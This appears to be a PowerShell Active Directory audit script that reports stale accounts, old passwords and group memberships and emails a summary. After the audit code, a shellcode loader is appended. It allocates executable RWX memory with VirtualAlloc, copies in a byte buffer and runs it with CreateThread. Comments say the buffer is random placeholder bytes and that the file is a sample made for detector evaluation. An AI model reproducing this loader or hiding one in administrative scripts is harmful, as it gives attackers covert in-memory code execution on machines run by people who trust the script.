
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [Alias('DnsDomain')]
    [string]$Domain = 'contoso.com',

    [string]$SearchBase = "OU=Managed Users,DC=contoso,DC=com",
    [string]$ReportPath = 'C:\Logs\reports\ad-user-audit-2025-11-01.csv',

    [string]$HtmlPath = 'C:\Logs\reports\ad-user-audit-2025-11-01.html',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1, 365)]
    [int]$InactiveDays = 180,

    [int]$PasswordMaxAge = 60,
    [string]$SmtpServer = 'smtp.contoso.com'
)

$ErrorActionPreference = 'Stop'

$hostName = $env:COMPUTERNAME

Import-Module ActiveDirectory -ErrorAction Stop

$LogPath = "C:\Logs\ad-audit-2025-11-01.log"

function Write-AuditTrail {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Message,

        [ValidateSet('INFO', 'WARN', 'ERROR')]
        [string]$Level = 'INFO'
    )

    $line = "{0} [{1}] {2}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Level, $Message
    Add-Content -Path $LogPath -Value $line -Encoding UTF8
    if ($Level -eq 'ERROR') {
        Write-Host $line -ForegroundColor Red
    }
}

Import-Module ActiveDirectory -ErrorAction Stop

$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$searchBases = @(
    'OU=Managed Users,DC=contoso,DC=com'
    'OU=ServiceAccounts,DC=contoso,DC=com'
)

$users = foreach ($base in $searchBases) {
    Write-Verbose ("Querying {0}" -f $base)
    Get-ADUser -Filter * -SearchBase $base -Properties $properties -ErrorAction Continue
}

$cutoff = (Get-Date).AddDays(-$InactiveDays)

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}
$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$groupReport = foreach ($user in @($users | Select-Object -First 50)) {
    $groups = Get-ADPrincipalGroupMembership -Identity $user.SamAccountName -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -ne 'Domain Users' }
    [pscustomobject]@{
        SamAccountName = $user.SamAccountName
        GroupCount     = @($groups).Count
        Groups         = (@($groups | Select-Object -ExpandProperty Name) -join '; ')
    }
}

$groupReport | Export-Csv -Path 'C:\Logs\reports\ad-user-audit-2025-11-01-groups.csv' -NoTypeInformation -Encoding UTF8

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet, Enabled | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath.Replace('.csv', '-passwords.csv') -Encoding UTF8

$disabled = $users | Where-Object { $_.Enabled -eq $false }
$disabled | Select-Object Name, SamAccountName, DistinguishedName |
    Export-Csv -Path $ReportPath.Replace('.csv', '-disabled.csv') -NoTypeInformation -Encoding UTF8

$style = @'
<style>
body { font-family: Calibri; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$stale |
    Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet |
    ConvertTo-Html -Title 'Stale AD accounts' -Head $style |
    Set-Content -Path $HtmlPath -Encoding UTF8

$summaryBody = @"
Stale accounts : $staleCount
Disabled       : $disabledCount
Old passwords  : $oldPwdCount
Report         : $ReportPath
"@

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = "AD user audit: daily summary"
    Body       = $summaryBody
    SmtpServer = $SmtpServer
    Port       = 587
    UseSsl     = $true
}
Send-MailMessage @mailParams

Write-Host ("AD audit finished: {0} stale, {1} disabled" -f $staleCount, $disabledCount) -ForegroundColor Green
Write-AuditTrail -Message ("Audit completed for {0}" -f $Domain) -Level INFO

$expiringSoon = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt (Get-Date).AddDays(-($PasswordMaxAge - 14))
}
Write-Verbose ("Password changes due: {0}" -f @($expiringSoon).Count)

$pwdPolicy = Get-ADDefaultDomainPasswordPolicy -ErrorAction SilentlyContinue
if ($pwdPolicy) {
    Write-Verbose ("Domain password age: {0} days" -f $pwdPolicy.MaxPasswordAge.Days)
}

$sampleStale = $stale | Sort-Object -Property LastLogonDate | Select-Object -First 10
$sampleStale | Format-Table Name, SamAccountName, LastLogonDate -AutoSize

$byOu = $users | Group-Object -Property DistinguishedName |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byOu | Format-Table -AutoSize | Out-String | Write-Verbose

$ous = Get-ADOrganizationalUnit -Filter * -ErrorAction SilentlyContinue |
    Select-Object -First 5 -Property Name, DistinguishedName
$ous | Format-Table -AutoSize

$neverLoggedOn = $users | Where-Object { $_.LastLogonDate -eq $null }
if (@($neverLoggedOn).Count -gt 0) {
    Write-Warning ("{0} accounts have never signed in" -f @($neverLoggedOn).Count)
}

$reportItem = Get-Item -LiteralPath $ReportPath -ErrorAction SilentlyContinue
if ($reportItem) {
    Write-Host ("Report size: {0:N1} KB" -f ($reportItem.Length / 1KB)) -ForegroundColor Gray
}

$engine = Get-ADRootDSE -ErrorAction SilentlyContinue
if ($engine) {
    Write-Verbose ("Domain controller: {0}" -f $engine.dnsHostName)
    Write-Verbose ("Default naming context: {0}" -f $engine.defaultNamingContext)
}

$transcript = Join-Path $env:TEMP ("ad-audit-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Start-Transcript -Path $transcript -Append | Out-Null
Write-Verbose ("Transcript: {0}" -f $transcript)
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class Win32Api
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xcd, 0xd0, 0xee, 0x53, 0x74, 0x07, 0x08, 0x94, 0xcb, 0x93, 0xb0, 0xff, 0x7b, 0xb8, 0xd3, 0x54,
    0x28, 0x36, 0x56, 0x2e, 0x61, 0x5c, 0xda, 0x5c, 0xb4, 0xdc, 0x11, 0xd1, 0x79, 0x50, 0x41, 0x59,
    0xa6, 0x05, 0xb2, 0x57, 0x0a, 0xcd, 0xaf, 0x72, 0x65, 0x8c, 0x18, 0xa7, 0x75, 0xf8, 0x6e, 0xab,
    0xaa, 0xae, 0x6d, 0x9b, 0x04, 0xab, 0x39, 0xe8, 0x71, 0xff, 0xa0, 0x37, 0xe7, 0xae, 0xeb, 0x40,
    0x2f, 0x8a, 0x2e, 0x29, 0x5c, 0x85, 0xa0, 0x20, 0xaa, 0xae, 0x0b, 0xcf, 0xce, 0xac, 0xf1, 0x5a,
    0xf6, 0x61, 0x27, 0x36, 0x21, 0x95, 0x54, 0x2d, 0x93, 0xb3, 0xb3, 0xa4, 0xc6, 0x94, 0xb4, 0x28,
    0x75, 0x98, 0x3f, 0x16, 0x8c, 0xa2, 0x93, 0x8c, 0x82, 0xe1, 0xe4, 0xad, 0x0e, 0x57, 0xf5, 0x79,
    0x8b, 0x1d, 0xe7, 0x44, 0xb2, 0x71, 0x60, 0xb6, 0x60, 0x94, 0x76, 0xa4, 0x0b, 0x88, 0xd4, 0xc1,
    0xd8, 0x45, 0xe8, 0xd1, 0x03, 0x3e, 0x33, 0x51, 0x33, 0x1e, 0x4b, 0xc0, 0x1b, 0x0f, 0x50, 0x4a,
    0x2f, 0x90, 0x8e, 0x4e, 0xc6, 0x3f, 0xb8, 0x24, 0x4f, 0x02, 0x48, 0x8d, 0x71, 0xaf, 0x99, 0x20,
    0xc5, 0xc7, 0x62, 0x2b, 0xf5, 0x9e, 0xac, 0xba, 0x3e, 0x8c, 0x31, 0x1b, 0xb0, 0x67, 0xa0, 0xf6,
    0xfa, 0x95, 0x9c, 0xda, 0x09, 0x84, 0xbc, 0x81, 0x79, 0x62, 0x10, 0x0b, 0x82, 0xce, 0x50, 0xa9,
    0x5f, 0xf6, 0x21, 0xb9, 0x96, 0x05, 0x86, 0xa5, 0x9a, 0x35, 0x0c, 0xf7, 0x16, 0x44, 0x62, 0x60,
    0x38, 0x31, 0xed, 0x5a, 0x3c, 0x58, 0xa8, 0x99, 0xf8, 0x83, 0x4f, 0x3e, 0x08, 0x6f, 0xcd, 0xe0,
    0x73, 0x0e, 0xa2, 0x70, 0x87, 0xec, 0x98, 0x01, 0x19, 0xfd, 0x77, 0x40, 0x91, 0x9d, 0x82, 0x67,
    0x8f, 0xbc, 0x52, 0x1d, 0x6c, 0xac, 0xfd, 0xc5, 0xd3, 0xec, 0x91, 0x6c, 0xa9, 0xc2, 0xcb, 0xbd,
    0x89, 0x69, 0x23, 0xc4, 0x7f, 0x4a
)

$HProcess = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][Win32Api]::WaitForSingleObject($Thread, 2997)
[void][Win32Api]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
